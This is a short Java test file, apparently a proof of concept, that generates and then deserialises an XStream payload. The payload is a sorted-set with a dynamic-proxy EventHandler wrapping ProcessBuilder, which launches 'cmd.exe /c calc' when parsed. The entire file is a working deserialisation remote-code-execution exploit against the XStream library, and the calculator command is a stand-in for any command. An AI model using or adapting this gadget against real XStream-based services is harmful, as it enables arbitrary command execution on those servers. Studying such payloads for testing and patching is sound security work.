import com.thoughtworks.xstream.XStream;

import java.beans.EventHandler;
import java.io.IOException;
import java.util.Set;
import java.util.TreeSet;

/**
 * 类说明：
 *
 * @author zhucj
 * @since 2019-08-14 - 09:35
 */
public class TestXstream {

    public static String expGen(){
        XStream xstream = new XStream();
        Set<Comparable> set = new TreeSet<Comparable>();
        set.add("foo");
        set.add(EventHandler.create(Comparable.class, new ProcessBuilder("calc"), "start"));
        String payload = xstream.toXML(set);
        System.out.println(payload);
        return payload;
    }
    public static void main(String[] args) throws IOException {
        expGen();
        XStream xStream = new XStream();
        String payload = "<sorted-set>\n" +
            "    <string>foo</string>\n" +
            "    <dynamic-proxy>\n" +
            "    <interface>java.lang.Comparable</interface>\n" +
            "        <handler class=\"java.beans.EventHandler\">\n" +
            "            <target class=\"java.lang.ProcessBuilder\">\n" +
            "                <command>\n" +
            "                    <string>cmd.exe</string>\n" +
            "                    <string>/c</string>\n" +
            "                    <string>calc</string>\n" +
            "                </command>\n" +
            "            </target>\n" +
            "     <action>start</action>"+
            "        </handler>\n" +
            "    </dynamic-proxy>\n" +
            "</sorted-set>\n";
        xStream.fromXML(payload);
    }
}
